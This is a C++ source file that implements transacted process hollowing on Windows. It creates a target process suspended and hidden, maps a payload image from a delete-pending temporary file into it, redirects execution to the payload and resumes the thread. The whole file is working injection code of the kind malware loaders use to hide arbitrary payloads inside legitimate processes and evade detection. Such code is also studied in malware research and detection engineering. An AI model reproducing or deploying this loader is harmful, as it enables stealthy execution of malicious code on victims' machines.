#include <windows.h>

#include <iostream>
#include <stdio.h>
#include <map>
#include <mutex>


#include "../include/ntddk.h"
#include "../include/kernel32_undoc.h"
#include "../include/util.h"
#include "../include/encryption.h"

#include "../include/process_info.h"
#include "../include/pe_hdrs_helper.h"
#include "../include/hollowing_parts.h"
#include "../include/delete_pending_file.h"
#include "../include/http_client.h"
#include "../include/json_printer.h"


bool create_new_process_internal(PROCESS_INFORMATION &pi, LPWSTR targetPath, LPWSTR args = NULL, LPWSTR startDir = NULL)
{
    if (!load_kernel32_functions()) return false;

    STARTUPINFOW si = { 0 };
    si.cb = sizeof(STARTUPINFOW);

    memset(&pi, 0, sizeof(PROCESS_INFORMATION));

    // Combine the target path and arguments into a single command line
    wchar_t cmdLine[MAX_PATH * 2] = {0};
    if (args != NULL && args[0] != L'\0') {
        swprintf_s(cmdLine, L"\"%s\" %s", targetPath, args);
    } else {
        swprintf_s(cmdLine, L"\"%s\"", targetPath);
    }

    HANDLE hToken = NULL;
    HANDLE hNewToken = NULL;
    if (!CreateProcessInternalW(hToken,
        NULL, // lpApplicationName
        cmdLine, // lpCommandLine (now includes arguments)
        NULL, // lpProcessAttributes
        NULL, // lpThreadAttributes
        FALSE, // bInheritHandles
        CREATE_SUSPENDED | DETACHED_PROCESS | CREATE_NO_WINDOW, // dwCreationFlags
        NULL, // lpEnvironment 
        startDir, // lpCurrentDirectory
        &si, // lpStartupInfo
        &pi, // lpProcessInformation
        &hNewToken
    ))
    {
        printf("[ERROR] CreateProcessInternalW failed, Error = %x\n", GetLastError());
        return false;
    }
    return true;
}

PVOID map_buffer_into_process(HANDLE hProcess, HANDLE hSection)
{
    NTSTATUS status = STATUS_SUCCESS;
    SIZE_T viewSize = 0;
    PVOID sectionBaseAddress = 0;

    if ((status = NtMapViewOfSection(hSection, hProcess, &sectionBaseAddress, NULL, NULL, NULL, &viewSize, ViewShare, NULL, PAGE_READONLY)) != STATUS_SUCCESS)
    {
        if (status == STATUS_IMAGE_NOT_AT_BASE) {
            std::cerr << "[WARNING] Image could not be mapped at its original base! If the payload has no relocations, it won't work!\n";
        }
        else {
            std::cerr << "[ERROR] NtMapViewOfSection failed, status: " << std::hex << status << std::endl;
            return NULL;
        }
    }
    std::cout << "Mapped Base:\t" << std::hex << (ULONG_PTR)sectionBaseAddress << "\n";
    return sectionBaseAddress;
}

DWORD transacted_hollowing(wchar_t* targetPath, BYTE* payladBuf, DWORD payloadSize, LPWSTR args)
{
    wchar_t dummy_name[MAX_PATH] = { 0 };
    wchar_t temp_path[MAX_PATH] = { 0 };
    DWORD size = GetTempPathW(MAX_PATH, temp_path);
    GetTempFileNameW(temp_path, L"TH", 0, dummy_name);
    HANDLE hSection = make_section_from_delete_pending_file(dummy_name, payladBuf, payloadSize);


    if (!hSection || hSection == INVALID_HANDLE_VALUE) {
        std::cout << "Creating transacted section has failed!\n";
        return false;
    }
    wchar_t *start_dir = NULL;
    wchar_t dir_path[MAX_PATH] = { 0 };
    get_directory(targetPath, dir_path, NULL);
    if (wcsnlen(dir_path, MAX_PATH) > 0) {
        start_dir = dir_path;
    }
    PROCESS_INFORMATION pi = { 0 };
    if (!create_new_process_internal(pi, targetPath, args, start_dir)) {
        std::cerr << "Creating process failed!\n";
        return false;
    }

    ProcessStorage::AddProcess(pi.dwProcessId, pi);
    std::cout << "Created Process, PID: " << std::dec << pi.dwProcessId << "\n";
    HANDLE hProcess = pi.hProcess;
    PVOID remote_base = map_buffer_into_process(hProcess, hSection);
    if (!remote_base) {
        std::cerr << "Failed mapping the buffer!\n";
        return false;
    }
    bool isPayl32b = !pe_is64bit(payladBuf);
    if (!redirect_to_payload(payladBuf, remote_base, pi, isPayl32b)) {
        std::cerr << "Failed to redirect!\n";
        return false;
    }
    std::cout << "Resuming, PID " << std::dec << pi.dwProcessId << std::endl;
    //Resume the thread and let the payload run:
    ResumeThread(pi.hThread);
    return pi.dwProcessId;
}
